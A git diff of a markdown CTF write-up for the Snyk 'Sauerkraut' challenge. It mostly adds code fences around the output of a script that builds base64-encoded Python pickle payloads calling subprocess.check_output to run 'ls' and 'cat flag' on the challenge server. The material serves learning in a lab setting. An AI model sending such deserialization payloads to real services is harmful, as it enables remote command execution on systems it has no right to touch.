@@ -11,7 +11,8 @@ There is a form page, in which, after a number of try with some string, we recei
 ## Resources
 
 ***Link***: https://ctf-101.snyk.io/challenges#Sauerkraut
-**server**: http://35.211.215.131:8000/
+
+***Server**: http://35.211.215.131:8000/
 
 ## Hint
 
@@ -29,12 +30,15 @@ I made a small script script.py that could trasform all the command serializing 
 
 This are the steps to take
 
+```
 python3.9 script.py 'ls'
 string not base 64b'\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\nsubprocess\x94\x8c\x0ccheck_output\x94\x93\x94]\x94\x8c\x02ls\x94a\x85\x94R\x94.'
 string base64 b'gASVKwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlIwCbHOUYYWUUpQu'
+```
 
+```
 python3.9 script.py 'cat flag'
 string not base 64b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\nsubprocess\x94\x8c\x0ccheck_output\x94\x93\x94]\x94(\x8c\x03cat\x94\x8c\x04flag\x94e\x85\x94R\x94.'
 string base64 b'gASVNAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5RdlCiMA2NhdJSMBGZsYWeUZYWUUpQu'
-
+```
 
